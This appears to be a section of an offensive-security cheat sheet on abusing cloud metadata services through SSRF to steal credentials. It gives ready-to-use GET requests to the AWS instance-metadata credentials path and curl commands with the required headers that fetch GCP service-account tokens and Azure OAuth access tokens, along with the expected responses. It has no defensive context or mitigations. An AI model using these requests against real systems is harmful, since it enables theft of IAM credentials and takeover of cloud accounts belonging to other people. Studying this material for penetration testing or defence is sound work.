# 2.2 Cloud Metadata Abuse

## Goal

Access cloud provider metadata endpoints to extract IAM credentials and account information.

---

## AWS EC2 Metadata

**Endpoint:** `http://169.254.169.254/latest/meta-data/`

**Discovery (if SSRF exists):**
```
GET http://169.254.169.254/latest/meta-data/
GET http://169.254.169.254/latest/meta-data/iam/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Retrieving Credentials:**
```
1. GET /latest/meta-data/iam/security-credentials/
   Returns: "my-role"

2. GET /latest/meta-data/iam/security-credentials/my-role
   Returns: {
     "AccessKeyId": "AKIA...",
     "SecretAccessKey": "...",
     "SessionToken": "..."
   }
```

**Impact:** Full AWS account access!

---

## GCP Metadata

**Endpoint:** `http://metadata.google.internal/`

**Headers required:**
```
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
```

**Information:**
- Service account tokens
- Project ID
- Instance metadata
- SSH keys

---

## Azure IMDS

**Endpoint:** `http://169.254.169.254/metadata/identity/oauth2/token`

**Exploitation:**
```
curl -H "Metadata:true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Returns:** Access token for Azure resources!
